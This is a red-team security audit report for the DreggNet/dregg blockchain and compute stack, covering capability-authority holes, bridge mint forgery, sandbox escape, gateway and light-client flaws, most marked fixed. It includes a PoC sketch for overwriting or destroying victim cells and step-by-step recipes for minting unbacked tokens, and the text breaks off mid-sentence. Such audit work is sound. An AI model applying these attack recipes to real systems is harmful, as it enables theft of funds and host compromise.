# DreggNet + dregg — Adversarial Red-Team Findings

Pass date: **2026-06-29**. Scope: a genuine-adversary security review across
`/Users/ember/dev/breadstuffs` and `/Users/ember/dev/DreggNet`, run BEFORE wider
exposure now that there is real money ($DREGG / the bridge), agents, and keys on
a live network. Method: attack each surface, distinguish **"Lean proves X"** from
**"the running Rust enforces X,"** and report what is EXPLOITABLE (with a PoC /
repro where cheap) vs what genuinely HOLDS (with the evidence). Companion to the
prior `redteam/MULTINODE-BYZANTINE-FINDINGS.md` (finality/devnet-edge: F-DOS-1
CLOSED, 9/9 Byzantine invariants held) and `redteam/THREAT-MODEL-FUZZ.md`
(wire/codec/executor). This pass covers the higher-stakes surfaces those did not:
money, cap-authority, sandbox, gateway/web/auth, mesh, light-client/recovery,
wallet.

The criticals were re-verified against source by the lead before stamping (cites
spot-checked at HEAD). Findings are honest both ways: a blocked attack ("I tried
X, stopped by Y at file:line") is reported as a HOLDS with its evidence; no
finding is manufactured.

> Reachability nuance, read first. Several of the sharpest findings are **latent**:
> the vulnerable code is a library / not-yet-wired path on `main` today (the bridge
> crate has no running relayer or webhook server; the finalized light-client check
> is only called from demos/tests). They are reported by **what happens on the
> obvious deployment**, because they are the money/finality primitives a deployer
> is meant to use. Each such finding is tagged `(latent)`. The ones that are live
> on the default build are tagged `(live)`.

---

## Summary table (criticals first)

| ID | Surface | Finding | Severity | Live? |
|----|---------|---------|----------|-------|
| **CAP-1** | Cap / authority | Kernel gate had a **default-allow hole**: `determine_required_permissions` was an allow-list with `_ => {}`, so `SetProgram`/`CellDestroy`/`CellSeal`/`CellUnseal`/`MakeSovereign` mapped to NO permission → `Authorization::Unchecked` accepted → overwrite/destroy a victim cell holding only any non-`Impossible` cap to it (cap amplification) | **CRITICAL** | ✅ FIXED (exhaustive match — no `_ =>`; SetProgram/MakeSovereign → SetVerificationKey floor, CellSeal/Unseal/Destroy → SetPermissions floor; Lean-aligned; PoC now refused, owner-signed still passes) |
| **CAP-FACET-1** | Cap / authority | The CAP-1 **direct** (non-`ExerciseViaCapability`) path was left **presence-only**: `check_cross_cell_permission`→`has_access_at` checked cap presence + non-`Impossible` + non-expired but never read `allowed_effects` (the facet). A SetField-only faceted cap could drive a `Transfer{from:victim}` against a `None`-permission target → Rust commits, Lean `authorizedB` rejects (rejection-parity break + cap amplification) | **HIGH** (CAP-1 class) | ✅ FIXED (direct path enforces the cap's `allowed_effects` facet via `permits_effect_including_delegation_at` → `is_effect_permitted`, matching the exercise sibling + Lean `authorizedB`; PoC `Transfer` now `FacetViolation`-refused, faceted-Transfer cap still passes; rejection-parity restored) |
| **BR-2** | Bridge (money) | Solana "trustless" verifier is forgeable at 4 points; deepest: inclusion proof proves an account *exists* on Solana, never that funds were *escrowed to the bridge* → mint arbitrary $DREGG having locked nothing | **CRITICAL** | latent — ✅ **FIXED** |
| **BR-3** | Bridge (money) | Conservation invariant is **vacuous** (`InsufficientLocked` is dead code: every mint credits both `currently_locked` and `live_supply` by the same amount); real conservation rests entirely on forgeable lock evidence (BR-2) | **CRITICAL** | latent — ✅ **FIXED** |
| **SBX-1** | Sandbox | wasmtime provider default is **root**: empty cap slice from `exec` falls through to `CapabilitySet::default() = grant_all()` → preopen host `/` read-write + `inherit_network`; untrusted workload reads/writes whole host fs + all tenants | **CRITICAL** | ✅ FIXED (provider default-deny `CapabilitySet::new()`; `instantiate_with_caps` override honors the real slice — empty ⇒ no preopens, network Deny; SBX-2 fail-closed preopen + default-deny imports; SBX-3 native-provider refuses off-Linux. Escape PoC blocked; cap-scoped access holds) |
| **GW-4a** | Gateway / bot | Discord `POST /api/op` was **unauthenticated custodial signing as any user** (signer derived from `bot_secret` + request-body `user_id`, no ownership proof) and publicly proxied → forge credentials / squat names on arbitrary users' cells | **CRITICAL→HIGH** | ✅ FIXED (per-user op-token ownership gate; unproven `user_id` → 401) — *needs redeploy* |
| **LC-2** | Light-client | Finalized light client has **no trusted validator set**: leg-3 accepts any N signatures over an attacker-supplied `participant_count` → an equivocating prover finalizes a fork | HIGH (CRIT-by-design) | ✅ **FIXED** (committee-anchored `verify_finalized_history`) |
| **F1** | Consensus | Federation Ed25519 QC verifier **does not dedup `voter_id`** → one committee key forges a full quorum cert / checkpoint / epoch transition | **HIGH** | ✅ FIXED (voter_id dedup; duplicate-vote QC rejected) |
| **LC-1** | Light-client | The wired web-surface `dregg://` content gate is **count-only, no crypto, no committee** (`has_quorum` = `len() >= threshold`, `threshold:0` passes) → malicious content server paints attacker bytes as "attested" | **HIGH** | ✅ **FIXED** (committee-anchored `verify_anchored`; `threshold:0` refused) |
| **LEASE-1a** | Lease / metering | Public machine-create synthesized a `funded:true` lease from the *attacker's requested guest size* → free compute on the public API | **CRITICAL** | ✅ FIXED (DreggNet `dev`: create gated on a verified on-chain funded lease — `FundingSource`/`AttestedFunding::from_verified_source`; self-asserted funding refused, fails closed; no funding source ⇒ no machine) |
| **LEASE-3** | Settlement | Exactly-once `(lease,period)` was **in-memory only**; on-chain memo not enforced → restart/2nd settler ⇒ duplicate real on-chain Transfers | **CRITICAL** | ✅ FIXED (DreggNet `dev`: durable `DurableSettleLedger` — `(lease,period)` reserved write-ahead before submit, at-most-once across restart; restart-no-double-charge proven) |
| **GW-1** | Gateway | Caddy basic-auth bypass via Host/SNI confusion: `*.dregg.works` is the no-auth block and `www.dregg.works` falls through to the machines API | HIGH | live |
| **GW-2** | Gateway | Machine create/delete/list/stop have **zero app-layer auth** (only synthetic lease) → unauth free compute + cross-tenant enumerate/destroy | HIGH | live |
| **NODE-1** | Recovery | Store-integrity boot gate checks an **unsigned, unkeyed, self-stored root** in the same tamperable redb → edit ledger + recompute public root ⇒ tampered store accepted | HIGH | ✅ **FIXED** (recovery anchored to the committee-signed attested root) |
| **NODE-2** | Recovery | **No anti-rollback / height monotonicity** on boot → swap an older internally-consistent snapshot ⇒ revert finalized spends/burns, resurrect consumed nullifiers | HIGH | ✅ **FIXED** (signed-height floor + monotonic high-water mark) |
| **MESH-2** | Mesh | dregg node `:8420`/`:9420` published to `0.0.0.0` (docker bypasses host ufw) with an **unauthenticated read API** → full ledger/receipt dump; gossip port exposed | HIGH | live |
| **F2** | Consensus | Federation admission bonds are **self-asserted, unbacked** (`sign(owner‖amount)`, no escrow) → `Bond::post(sk, u64::MAX)` admits a free Sybil | HIGH | live (crate boundary) |
| **BR-1** | Bridge (money) | Unsound RAM mint APIs (`mint_against_lock`/`mint_against_payment`) still `pub`, dedup only per-process → two relayers double-mint one lock | HIGH | latent — ✅ **FIXED** |
| **LEASE-1c/2** | Lease / metering | Settled meter total is self-reported by the backend (no `meter_units ≤ budget`); no atomic balance ⇒ same lease runs N times | HIGH | live |
| **LC-3** | Light-client | The production-wired wasm light client has **no finality gate at all** (legs 1+2 only) → cannot tell a finalized chain from an equivocating fork | MED-HIGH | ✅ **FIXED** (`verify_finalized_devnet_history` wires the committee-anchored finality leg) |
| **WALLET-3** | Wallet | Any origin can `dregg:subscribe` (unrestricted) → `notifySubscribers` broadcasts the user's receipt/activity/intent stream to every page, no origin check | MEDIUM | live |
| **MESH-1** | Mesh | Headscale preauth keys are **reusable + 30-day** → one leak = unlimited persistent unauthorized joins | MEDIUM | live |
| LC-4 | Light-client | Cert↔aggregate finality seam binds only ~31 bits (lane-0 felt) of the state root | MEDIUM | latent |
| LC-5 | Light-client | `AttestedRoot::is_valid` returns true for any 48-byte ThresholdQC without BLS verify | MEDIUM | live |
| F3/F4/F5 | Consensus | Threshold-decrypt is trusted-dealer w/ key==ciphertext-key + non-CT MAC; no QC-vote-equivocation slashing atom; KZG/beacon constructors with transient toxic waste | MEDIUM | live (constructors) |
| GW-1b | Gateway | `simbi`/`dregg-admin` bcrypt hashes committed in `Caddyfile` (cost-14, offline-crackable if weak) | MED | live |
| WALLET-4 | Wallet | `recoverFromMnemonic` lacks the `walletExists()` guard onboarding has → silent overwrite/data loss | LOW-MED | live |
| LEASE-4b | Lease | Unchecked i64 arithmetic in the budget gate (`total + cost_per_step`) → wrap-to-unbilled (release) / panic (debug) | LOW-MED | live |
| MESH-3 | Mesh | `tag:compute → tag:edge:5432` + default `dreggnet/dreggnet` Postgres creds (latent: pg is compose-internal today) | MED | latent |
| MESH-0 | Mesh | The vendored `tailscale_auth` whois middleware is **not wired into any service** — no tenant authenticates by tailnet identity | INFO | live |

**Surfaces that HOLD (verified):** the bridge Stripe-webhook HMAC (real, constant-time, secret not hardcoded); the committed bridge double-mint nullifier path; cap-grant/bearer attenuation (3-axis) and signature/replay forgery; the aggregate IVC core + VK pin; BLS/DKG/VRF cryptography; the wallet's key-exfil and blind-sign defenses; the portal publish-cap attenuation; the discord key-vault, channel isolation, and `/admin` authz; the tailnet ACL shape. Evidence in each section.

---

## 3. Cap / authority (the core) — **CRITICAL CAP-1**

The single most serious finding of this pass, and a real Rust↔Lean divergence.

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1a | Amplify on the `GrantCapability` path (perms/mask/expiry) | **HOLDS** — 3-axis attenuation (`apply.rs:539,556,571`) | — |
| 1b | Amplify via bearer / introduce | **HOLDS** (`authorize.rs:1341,1360`; `apply.rs:1899,1912`) | — |
| 1c/3 | **Amplify a weak cap / bypass the gate via an unmapped state-mutating effect** | **EXPLOITABLE** | **CRITICAL** |
| 2 | Forge a signature / replay a token | **HOLDS** — `verify_strict` + fed/nonce/position binding (`authorize.rs:889-943`) | — |

### CAP-1 (CRITICAL) — default-allow hole for ~6 state-mutating effects — ✅ FIXED

> **STATUS: FIXED** (`turn/src/executor/authorize.rs::determine_required_permissions`).
> The trailing `_ => {}` is gone — the per-effect match is now **exhaustive (closed)**,
> so `rustc` forces every present and future `Effect` variant to make a deliberate
> authority decision (no silent default-allow). The five unguarded effects are mapped
> to their Lean-aligned authority floor: `SetProgram` (direct, `cell == target`) and
> `MakeSovereign` → the `SetVerificationKey` floor (a cell's VK / caveat-program /
> hosting model are one authority surface); `CellSeal` / `CellUnseal` / `CellDestroy` →
> the `SetPermissions` floor. With a non-`None` floor required on the target, a bare
> `Authorization::Unchecked` no longer satisfies the gate — the PoC below is **REFUSED**.
> Regression-pinned by `cap1_authority_tests` (5 refusal teeth + 2 owner-signed
> no-false-reject + 1 required-permission-map check); the full `dregg-turn` lib suite
> stays green. This restores Rust↔Lean rejection-parity for these effects
> (`Dregg2.Exec.EffectsAuthority` / `EffectsState` gate them on the cell's authority).
>
> The original analysis follows.

**Root.** The WHO/WHAT gate runs `verify_authorization` on every action before its
effects apply; the required-permission set is computed by
`determine_required_permissions` (`turn/src/executor/authorize.rs:2051`), which is
an **allow-list ending in a silent `_ => {}`** (verified at `authorize.rs:2122`).
Only `Transfer/Send`, `SetField`, `IncrementNonce`, `Grant/RevokeCapability`,
`SetPermissions`, `SetVerificationKey`, and `Refusal` are mapped. When the mapped
set is empty, the gate falls to the general `Access` permission
(`authorize.rs:230-243`), which for `default_user()`/`sovereign_default()` is
`AuthRequired::None`, and `None` is satisfied by `Authorization::Unchecked`
(`authorize.rs:692` → `Ok`; verified). `Unchecked` is a fully valid wire value
(serde `alias "None"`, `action.rs:243`).

**The unguarded effects** (mutate live victim state, absent from the map, no
internal authority check when `cell == action_target`):
- `Effect::SetProgram` — `apply.rs:877`. Cross-cell check is gated on
  `cell != action_target` (`apply.rs:887`, verified); equal ⇒ skipped, program
  (the cell's caveat/predicate guards) overwritten at `apply.rs:913` with no auth.
  Its doc-comment claims parity with `apply_set_verification_key` — **false**:
  `SetVerificationKey` *is* mapped, `SetProgram` is not.
- `Effect::CellDestroy` — `apply.rs:2513` (irreversible tombstone; `DeathCertificate`
  is unsigned attacker-filled structural data, `lifecycle.rs:160`).
- `Effect::CellSeal` / `CellUnseal` — `apply.rs:2448,2481` (freeze/unfreeze).
- `Effect::MakeSovereign` — `apply.rs:2122` (change hosting/accounting model).

(Properly self-authorizing, NOT vulnerable: `Mint` requires a mint-cap;
`ExerciseViaCapability` enforces the cap permission-level AND `allowed_effects`
facet on every inner effect at `apply.rs:1770-1818` — the proper check the direct
path lacks.)

**The amplification.** To act on a victim `X ≠ agent`, `execute_tree.rs:447-453`
requires `has_access_at` (`capability.rs:500`), which returns true for **any**
capability whose `permissions != Impossible` — it ignores the cap's permission
*level* and `allowed_effects` *facet*. So a receive-only / transfer-only / narrow
cap to `X` is sufficient to overwrite `X`'s program or destroy it. The lattice you
carefully attenuated is never consulted for these effects. (And on a path that
does not bind `turn.agent` to a signer — the node HTTP submit *does* bind it, but
that is an HTTP-layer defense, not an executor one — `turn.agent = X` skips the
cap gate entirely; the victim pays the fee.)

**PoC sketch (no key, weak cap):**
```
Turn { agent: ATTACKER, nonce, fee, call_forest: [ Action {
    target: VICTIM_X,                       // attacker holds any non-Impossible cap to X
    authorization: Authorization::Unchecked,
    effects: [ Effect::SetProgram { cell: VICTIM_X, program: attacker_program } ],
}]}
// determine_required_permissions = []  → Access(None) → Unchecked Ok → program overwritten
// swap SetProgram for CellDestroy{target:X, certificate:{cell_id:X,..}} to tombstone X
```

**Rust↔Lean divergence.** The verified kernel `stateStep`
(`Dregg2.Exec.EffectsState.lean:208`, cited in these very handlers) gates these
writes on the *authority* leg; the Rust comments mirror only the kernel's
*liveness* leg (`is_live()`) for these effects. The `apply_set_program` comment
even admits "no descriptor rung binds this write … VK-affecting (ember-gated)."
The Lean non-amplification proof holds for the *modeled* effects; the Rust gate's
allow-list silently drops these variants — exactly the dangerous
direction `rejection_parity.rs` is meant to catch.

**Fix.** Make `determine_required_permissions` an **exhaustive (closed) match**
with no catch-all, mapping every state-mutating variant to its authority floor
(`SetProgram`/`MakeSovereign` → `SetVerificationKey`; `CellSeal`/`CellUnseal`/
`CellDestroy` → `SetPermissions` or a dedicated `Lifecycle` permission).
Additionally enforce the held cap's permission-level + `allowed_effects` facet on
the direct path the way `ExerciseViaCapability` already does, so a narrow cap
cannot be amplified. A future effect variant must then fail-closed by construction
(exhaustive match ⇒ compile error forces a deliberate mapping).

### HOLDS (verified)
Lattice `is_narrower_or_equal` sound (`permissions.rs:52`); grant attenuation on
all 3 axes (`apply.rs:539,556,571`); bearer/introduce enforce narrowing + facet +
expiry (`authorize.rs:1341,1360`); signature forgery & replay closed —
`verify_strict` with `federation_id + turn_nonce + position` bound into the message
(`authorize.rs:889-943`), `OneOf` cannot reduce to `Unchecked`, `CapTpDelivered`
has a non-amplification floor. The forgery surface is closed; the hole is that for
~6 effects **you do not need to forge anything** — the gate asks for nothing.

### CAP-FACET-1 (HIGH, CAP-1 class) — direct cross-cell path ignored the cap facet — ✅ FIXED

> **STATUS: FIXED** (`turn/src/executor/apply.rs::check_cross_cell_permission`).
> Found by the executor↔Lean parity sweep (`UNDER-WIRED-parity.md` #1). The CAP-1
> fix above *recommended* enforcing the held cap's `allowed_effects` facet on the
> direct path "the way `ExerciseViaCapability` already does" — but the landed CAP-1
> change only closed the `determine_required_permissions` default-allow; the direct
> cross-cell gate was left presence-only. CAP-FACET-1 is exactly that residual.

**Lean property.** A direct (non-exercise) write/transfer routes through `authorizedB`
(`metatheory/Dregg2/Exec/Kernel.lean:54`): the actor is authorized over `src` iff
`actor == src`, OR it holds a `node` cap, OR an `.endpoint t rights` cap **whose
`rights` carry the required facet** (`write` for balance/setField). So Lean enforces
the facet on the **direct** path, not just on exercise.

**What the Rust did.** The direct gate `check_cross_cell_permission` resolved authority
through `has_access_including_delegation_at` → `CapabilitySet::has_access_at`
(`cell/src/capability.rs:500`), which checks only `target` match + non-`Impossible` +
non-expired — it **never read `allowed_effects`**. The held cap was reduced to "does an
edge exist." The `ExerciseViaCapability` sibling (`apply.rs:1803`) *does* enforce the
facet via `is_effect_permitted` (the P2-1 fix); the direct sibling was presence-only.

**PoC (now refused).** Alice holds a `FACET_STATE_WRITER` (SetField-only, no Transfer)
cap to Bob; Bob's `Send` permission is `None` (the pure object-capability case where the
facet *is* the whole attenuation boundary). Alice submits an ordinary
`Effect::Transfer { from: Bob, .. }` directly. Pre-fix: presence ✓ + `required == None`
✓ → the transfer **committed** (Lean's `authorizedB` refuses the same move — a
rejection-parity violation in the dangerous direction, Rust accepts what the verified
kernel rejects). Tests: `turn/src/tests.rs::test_direct_cross_cell_facet_refuses_disallowed_effect`
(now `FacetViolation`, balance unmoved) + `..._allows_matching_effect` (a
`FACET_TRANSFER_ONLY` cap on the same path still passes — no false-reject).

**Fix.** `check_cross_cell_permission` now takes the attempted effect's `effect_bit` and,
after the presence check, requires `permits_effect_including_delegation_at` — a
facet-aware sibling of the access helper that admits a path only when some held c-list /
delegation-snapshot cap to the target has `allowed_effects` covering the effect bit
(`CapabilitySet::permits_effect_at` → `is_effect_permitted`). Presence stays a
`CapabilityNotHeld`; a present-but-faceted-away cap becomes a `FacetViolation`, matching
the exercise sibling and Lean `authorizedB`. All 11 direct-path call sites (SetField,
Transfer, GrantCapability, RevokeCapability, IncrementNonce, SetPermissions,
SetVerificationKey, SetProgram, Refusal, Burn, exercise's Transfer.from leg) pass their
own effect bit. (LEVEL on the direct path was already benign/over-restrictive — only the
FACET axis under-enforced.) Suites green: `dregg-turn` lib 568, `dregg-cell` 631,
`exec-lean` `rejection_parity`.

---

## 1. Bridge (money) — **CRITICAL BR-2, BR-3**

**Scope note:** `dregg-bridge` is library-only on `main` — no relayer daemon, no
webhook server, no binary wires a mint/verify API (every caller lives in doctests
/ `bridge/tests`). All bridge findings are therefore `(latent)`: they bite the
moment the obvious API is deployed.

> ✅ **BR-1/2/3 FIXED (2026-06-29), before any relayer/webhook deploy.** The
> escrow-to-bridge binding, non-vacuous conservation, and RAM-mint gating below
> are now enforced and tested in `bridge/src/{solana_mirror,solana_trustless,
> stripe_mirror}.rs`. Summary of the closures:
>
> - **BR-2-B / BR-3 (deepest, "defeats even the anchored path"):**
>   `MirrorConfig` now pins `vault_account` (the canonical bridge PDA) and
>   `lock_program` (the vault owner). `SolanaLockProof::binds_bridge_vault`
>   requires the inclusion's escrow account to BE that vault — and, on the
>   mainnet path, to be OWNED by the lock program. Every trustless mint (and the
>   `SolanaConsensusStatement::of_verified` succinct seam) enforces it. A
>   consensus-valid proof whose lock record sits in a foreign account is now
>   rejected with `ClaimMismatch` (test `mint_against_proof_for_foreign_vault_is_rejected`,
>   and the statement-level `succinct_statement_…`).
> - **BR-3 (conservation now NON-VACUOUS):** escrow accounting is decoupled from
>   the mint draw. `currently_locked` / `total_verified_payments` is raised ONLY
>   by an independently-verified lock/payment (`record_escrow` /
>   `record_payment_backing`); the mint draws against it (`draw_mint`) and is
>   refused by `InsufficientLocked` / `InsufficientBacking` when it would exceed
>   the backing. A mint with no escrow, or a draw beyond it, is rejected — tested
>   true AND false (`draw_without_escrow_breaks_conservation`,
>   `over_mint_beyond_escrow_is_rejected`, `draw_beyond_backing_breaks_conservation`).
> - **BR-2-D (structure-only mint):** the state-mutating `mint_against_lock_proof`
>   (which credited after only a self-consistency check) is REMOVED; minting
>   requires `ConsensusVerified` (`structure_only_verify_does_not_mint`).
> - **BR-2-A (authorized voter):** the value-bearing mint routes through the
>   anchored, on-chain-authorized-voter-bound tally; an imposter signer drops
>   below 2/3 and the mint is refused (`anchored_mint_refused_unauthorized_voter`).
> - **BR-2-C (pinned anchor):** `MirrorConfig` pins the weak-subjectivity anchor
>   `(epoch, root)`; a caller-supplied anchor that differs is refused with
>   `AnchorNotPinned` before any consensus check (`anchored_mint_pins_the_governance_anchor`).
> - **BR-1 (RAM mint double-mint):** all RAM mint methods
>   (`mint_against_lock`, `mint_against_lock_proof_consensus`,
>   `mint_against_lock_proof_anchored`, `mint_against_payment`,
>   `mint_against_webhook`) are now `#[cfg(any(test, feature = "test-utils"))]`
>   — absent from the production build. The exposed production surface is the
>   `verify_*` functions + the committed `bridge_mint_against_lock` (whose
>   `note_nullifiers` set is the GLOBAL double-mint authority).
>
> Residual (named, not closed by this lane): the in-circuit binding of
> `(nullifier, recipient, amount)` via `action_binding`/`bridge_action_air` is a
> separate VK-affecting weld; and the mainnet wire-ingestion / stake-table
> rotation refinements named in `docs/deos/TRUSTLESS-SOLANA-BRIDGE.md` remain.

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Double-mint / bypass `lock_id` nullifier | Committed path **HOLDS**; RAM path EXPLOITABLE-if-deployed | HIGH |
| 2 | Forge a Solana lock | **EXPLOITABLE** — 4 independent breaks, incl. one defeating the "fully trustless" path | CRITICAL |
| 3 | Break conservation (mint from air) | Arithmetic HOLDS; backing-binding EXPLOITABLE (= #2); invariant vacuous | CRITICAL |
| 4 | Forge a Stripe webhook | **HOLDS** — real constant-time HMAC, secret not hardcoded | LOW |

### BR-2 (CRITICAL) — forge a Solana lock
The deployed-today leg is a **single Ed25519 oracle key** (not the threshold the
"federation" language implies): `FederationAttestation::verify` (`midnight.rs:75-108`)
is correct, so you cannot forge without that key — but whoever holds it mints at
will. The "trustless upgrade" (`solana_trustless.rs`) is forgeable at four points:
- **BR-2-D:** `mint_against_lock_proof` (`solana_trustless.rs:805-822`) credits
  after only `verify_lock_proof` — a self-consistency + `voted*3 >= total*2` check
  over **attacker-supplied scalars**, no sigs/stake/root. Returns `StructureOnly`,
  but **state already mutated** before the advisory flag is visible.
- **BR-2-B (deepest):** `verify_inclusion` (`:759-795`) hashes attacker-chosen
  `owner`/`vault_account` into the leaf but never checks `owner` is the bridge
  lock-program or `vault_account` is a canonical bridge PDA. `MirrorConfig` has no
  vault/program field. A "lock" is a 72-byte self-asserting blob
  (`lock_id‖recipient‖amount_le`). Attack: put that blob in any ~0.001-SOL account
  on real Solana → it lands in a genuine 2/3-signed finalized accounts hash → mint
  arbitrary $DREGG having escrowed nothing. **Defeats even the anchored path.**
- **BR-2-A:** legacy `verify_supermajority`/`tally_votes` counts a vote on
  `witness_binds` `(vote_account, slot, bank_hash)` without checking the signer is
  the on-chain authorized voter → attacker signs all big vote accounts with own key.
- **BR-2-C:** the stake table and weak-subjectivity anchor are **per-call args**
  (`:442,569,864`), not pinned in `MirrorConfig` — supply your own 100%-stake table.

**Genuinely sound:** `LockProofTrust` is output-only; tally math correct
(`solana_consensus.rs:332-388`); bank-hash⇄accounts-hash⇄inclusion chain closed;
vote-tx Ed25519 parsing real; the anchored provenance is sound on stake/voter axes
*given a real anchor*. **Fixes:** route every value-bearing mint through the
authorized-voter-bound tally; bind inclusion to a bridge-owned escrow
(`owner == lock_program_id`, `vault_account == pinned PDA`, real SPL layout); pin
the anchor as a governance constant; gate minting on `ConsensusVerified` only.

### BR-3 (CRITICAL) — conservation is vacuous
All arithmetic is `u64`+`checked_add` (HOLDS), but the committed conservation check
is dead: `bridge_mint_against_lock` credits *both* `currently_locked` and
`live_supply` by the same `amount` (`bridge_ledger.rs:211-217`), so
`new_live > new_locked ⟺ live > locked` — `InsufficientLocked` can never fire (same
in `solana_mirror.rs:465`, `stripe_mirror.rs:559`). `currently_locked` is
decorative; security rests entirely on lock-evidence validity (forgeable, BR-2) +
nullifier uniqueness. **Fix:** establish `currently_locked` from an *independent*
verified-lock source; bind `(nullifier, recipient, amount)` in-circuit via the
existing-but-unwired `action_binding`/`bridge_action_air`.

### BR-1 (HIGH) — RAM-path double-mint
The committed path is sound (atomic contains-then-insert on `note_nullifiers`,
projected to committed state `umem.rs:520-522,2247-2249`; two-relayer race blocked,
`committed_double_mint.rs`). But `MirrorState::mint_against_lock` /
`StripeMirrorState::mint_against_payment` dedup only per-process `BTreeSet`s and
remain `pub` and ergonomic → two relayer processes double-mint one lock.
**Fix:** make the RAM mint methods `pub(crate)`/deprecated; expose only
`verify_*` + `bridge_mint_against_lock`.

### HOLDS — Stripe webhook (BR-4)
Signed payload `"{t}.{body}"`, recomputed HMAC-SHA256 compared **constant-time**
(`subtle::ConstantTimeEq`) against every `v1` (`stripe_mirror.rs:253-291`); secret
is config, not hardcoded; tamper breaks it (`forged_signature_is_refused`).
Idempotency dedups on `payment_intent_id`. **Footguns (LOW):** replay-window check
is skipped when `now=None` (every example passes `None` — disables freshness, but
the nullifier still stops replay); `charge.succeeded` uses `amount` not
`amount_captured` (partial-capture over-mint).

---

## 4. Sandbox escape — **SUPERSEDED by the owned-compute rewrite**

**Status:** The SBX-1/2/3 escape findings below were against the external
wasmtime/native/firecracker sandbox providers of the (now **removed**) compute
submodule. That submodule — and every one of those providers — is gone: compute is
now **owned and in-crate**. The only tier that genuinely executes guest code is the
**owned `wasmi` Sandboxed tier** (pure-Rust, zero `unsafe`, provider label
`dreggnet-wasmi`), whose host imports are no-op stubs and whose store is fresh per
instance — the same HOLDS posture the old `wasmi ("Sandboxed")` row carried (residual:
DoS-only, no fuel/mem cap). **Every stronger tier is now a fail-closed seam** — JIT
(`JitSandboxed`), `Caged`/native (provider label `dreggnet-native (seam)`),
`MicroVm`/Firecracker (`dreggnet-microvm (seam)`), and the native python/node interpreter
langs all return `ExecError::TierNotServed` / `NotWired` and execute **no** guest code
at all. So the host-reaching escape surface those findings described (root preopens,
in-process `dlopen`, fail-open landlock) **does not exist today**: there is nothing to
escape from, because nothing but the owned wasmi sandbox runs. Wiring an owned engine
for each stronger tier is future work — and a fail-closed seam is the safe default until
it lands. The historical SBX-1/2/3 detail is retained below for the record. (Residual,
OUT OF THIS LANE: single static `TENANT` — per-tenant partition rides the bridge/cap
lane.)

### Verdict table (pre-fix assessment)
| Provider / surface | Escape cap-bounds | Reach host | Cross-tenant | Cap-threading |
|---|---|---|---|---|
| **wasmtime (exec path)** | ✅ FIXED — default-deny `new()` → no preopen | ✅ FIXED — empty caps = no fs, net Deny | ✅ FIXED — no root `/` preopen at all | ✅ FIXED — `instantiate_with_caps` honors slice |
| wasmtime (explicit `host=` caps) | HOLDS | HOLDS | MED (request-ctx heap residue) | HOLDS |
| **native-provider** (in-proc dlopen) | ✅ FIXED — refuses off-Linux (no isolation boundary) | ✅ FIXED off-Linux | ✅ FIXED off-Linux | reports `None` off-Linux (no over-advertise) |
| native-process-provider ("Caged") | HOLDS (macOS refuses); HIGH Linux landlock fail-open | HOLDS (`env_clear`+seccomp/landlock pre_exec) | HOLDS | HOLDS |
| firecracker | HOLDS (KVM; net never configured) | HIGH (no jailer; ctrl socket in `/tmp`) | HOLDS (ro shared rootfs) | MED |
| wasmi ("Sandboxed") | HOLDS (host imports no-op) | HOLDS | HOLDS (fresh store) | N/A (DoS: no fuel/mem limit) |
| container | HOLDS (cap_drop ALL, ro-rootfs, net=none) | HOLDS | HOLDS | LOW (cap xlate dead/over-restrictive) |

### SBX-1 (CRITICAL) — wasmtime exec path runs every workload as ROOT — ✅ FIXED
**Fixed:** `WasmtimeProvider::new` now seeds `default_caps` with `CapabilitySet::new()`
(empty = deny), and `WasmtimeProvider` overrides `instantiate_with_caps` to build the
capability set from the passed slice verbatim — so the `&[]` slice `exec` hands it is a
deny-all set (zero preopens, network `Deny`), not the `grant_all` root it used to fall
back to. The trait-default discard path (leg 2) is no longer taken for wasmtime.

Full chain verified by the reviewer (lead confirmed `add_to_linker_sync` links the
full WASI P2 fs+sockets world unconditionally):
1. `exec/src/lib.rs:508-509` — `instantiate_with_caps(&component, &[], TENANT)`.
2. the removed submodule's `core/src/provider.rs:666-674` — `WasmtimeProvider` did NOT
   override `instantiate_with_caps`; the trait default **discards** caps+tenant and
   calls `instantiate(component)`.
3. `.../wasmtime/src/provider.rs:399-401,191` — `instantiate()` reads
   `self.default_caps`, init'd to `CapabilitySet::default()`.
4. `.../core/src/capability.rs:639-647` — `Default for CapabilitySet` =
   `grant_all()` → **root** (every effect, `ResourcePattern::Any`).
5. `.../wasmtime/src/lib.rs:931-950,1027-1028` — root `Filesystem/Any` → preopen
   host `/` with `DirPerms::all()/FilePerms::all()`; root `Network/Any` →
   `inherit_network()`.
6. `.../wasmtime/src/lib.rs:643` — `wasmtime_wasi::p2::add_to_linker_sync` binds
   real host-backed fs+socket impls into every store.

Net: an untrusted component run through `exec` reads/writes anywhere under `/`
(`/etc/shadow`, SSH keys, every other tenant's data) and opens arbitrary sockets.
Compounded by a single static `TENANT = "dreggnet-exec"` (`exec/src/lib.rs:900`)
— no per-tenant partition. **Fix:** `WasmtimeProvider` must override
`instantiate_with_caps` to build the set from the passed slice (empty ⇒ deny);
provider default must be `CapabilitySet::new()` (empty), never `default()`; `exec`
must refuse rather than pass `&[]` while claiming enforcement.

### SBX-2 (CRITICAL) — `fs_preopen_from_cap` fails *open* — ✅ FIXED
Independent of SBX-1: `Filesystem/Read` with no `host=` → preopen `/` (read);
`Filesystem/Any` → `/` RW (the production global `presets::agent()` is
`Filesystem/Any`, `runtime/src/lib.rs:713`). `enforce.rs:107-110` also
default-*allows* every `wasi:*` import despite a "default deny" comment.
**Fixed:** `fs_preopen_from_cap` is now fail-closed — it returns `None` (the grant is
denied) unless an explicit host path is present (`host=`/`resource=` constraint, or an
`Exact`/`Prefix` resource pattern); the `/` and `/tmp` fallbacks are removed and the
default permission is read-only (write needs an explicit `mode`/`Write`). So
`Filesystem/Any` (and even the root `grant_all` set) projects to ZERO preopens. The
`enforce.rs` import gate now default-DENIES when no import-bearing cap is granted
(was `name.starts_with("wasi:")` allow-all), and `handle_filesystem` no longer pushes
`/`/`/tmp`.

### SBX-3 (CRITICAL) — `native-provider` is not an isolation boundary — ✅ FIXED
Compiles guest wasm and `dlopen`s it **in the provider's own process** — no memory
isolation, all tenants one heap; on macOS seccomp is off and `cage-primitives` is
Linux-only and **does not refuse**, reporting `OsSandbox` while running guest
native code with full ambient authority. (`exec`'s "Caged" tier correctly routes to
`native-process-provider`, but `native-provider` is reachable via runtime
selection.) **Fixed:** `compile_and_load` refuses on non-Linux BEFORE any `dlopen`
(mirroring `native-process-provider`), so no guest-native code is loaded on a host
